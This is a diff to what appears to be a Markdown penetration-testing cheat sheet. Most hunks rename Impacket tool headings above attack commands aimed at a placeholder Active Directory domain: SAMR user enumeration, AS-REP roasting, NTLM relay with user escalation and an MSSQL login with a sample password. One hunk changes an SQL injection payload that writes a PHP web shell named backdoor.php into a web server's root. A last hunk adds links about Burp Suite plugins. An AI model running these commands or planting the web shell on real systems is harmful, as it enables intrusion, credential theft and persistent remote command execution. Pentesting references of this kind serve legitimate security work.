@@ -402,7 +402,7 @@ root@kali:$ nullinux.py 127.0.0.1
 ```
 
 
-#### impacket-samrdump.py
+#### samrdump.py
 
 ```
 root@kali:$ samrdump.py 127.0.0.1
@@ -412,7 +412,7 @@ root@kali:$ samrdump.py 127.0.0.1
 
 ### AS_REP Roasting
 
-`impacket-GetNPUsers.py`:
+`GetNPUsers.py`:
 
 ```
 root@kali:$ GetNPUsers.py EXAMPLE.LOCAL/ -dc-ip 127.0.0.1 -k -no-pass -usersfile users.txt -request -format john -outputfile asrep.hash
@@ -459,7 +459,7 @@ PS> Add-DomainObjectAcl -TargetIdentity 'DC=example,DC=local' -PrincipalIdentity
 ```
 
 
-#### impacket-ntlmrelayx.py + impacket-secretsdump.py
+#### ntlmrelayx.py + secretsdump.py
 
 ```
 root@kali:$ ntlmrelayx.py -t ldap://127.0.0.1 --escalate-user snovvcrash
@@ -883,7 +883,7 @@ root@kali:$ sqsh -S 127.0.0.1 -U 'EXAMPLE\snovvcrash' -P 'qwe123'
 ```
 
 
-#### impacket-mssqlclient.py
+#### mssqlclient.py
 
 ```
 root@kali:$ mssqlclient.py EXAMPLE/snovvcrash:'qwe123'@127.0.0.1 [-windows-auth]
@@ -1028,7 +1028,7 @@ id=-1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT table_name from mysql.innodb
 ### Write File
 
 ```
-id=1' UNION ALL SELECT 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 INTO OUTFILE 'C:\\Inetpub\\wwwroot\\backdoor.php';#
+id=1' UNION ALL SELECT 1,2,3,4,"<?php if(isset($_REQUEST['c'])){system($_REQUEST['c'].' 2>&1' );} ?>",6 INTO OUTFILE 'C:\\Inetpub\\wwwroot\\backdoor.php';#
 ```
 
 
@@ -3485,3 +3485,11 @@ certmgr.msc -- "Certificates - Current User" -- "Сертификаты - тек
 * [All labs / Web Security Academy](https://portswigger.net/web-security/all-labs)
 * [SQL injection cheat sheet / Web Security Academy](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 * [Cross-Site Scripting (XSS) Cheat Sheet / Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+
+
+
+
+## Upgrade Burp
+
+* [www.jython.org/download.html](https://www.jython.org/download.html)
+* [xakep.ru/2018/08/23/burp-suite-plugins/](https://xakep.ru/2018/08/23/burp-suite-plugins/)
